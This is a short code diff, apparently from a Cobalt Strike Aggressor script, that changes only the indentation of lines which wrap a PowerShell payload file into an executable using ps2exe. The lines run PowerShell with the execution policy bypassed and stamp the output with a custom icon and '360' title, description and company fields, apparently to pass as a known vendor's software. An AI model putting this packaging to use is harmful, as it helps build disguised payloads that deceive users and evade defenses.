@@ -57,10 +57,9 @@ sub show {
 			$output_exe = "$1";
 			if ($int_version == "4") {
 				$process = exec('powershell.exe -ExecutionPolicy bypass -command "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime40 -title 360 -description 360 -company 360"');
-		
-		} else {
-			$process = exec('cmd.exe /c echo '.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime20 -title 360 -description 360 -company 360 | powershell -ExecutionPolicy bypass');
-		}
+		    } else {
+			    $process = exec('cmd.exe /c echo '.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$output_exe.' -iconFile '.$ico_path.' -noConsole -runtime20 -title 360 -description 360 -company 360 | powershell -ExecutionPolicy bypass');
+		    }
 			@data = readAll($process);
 			println(@data);
 			closef($process);
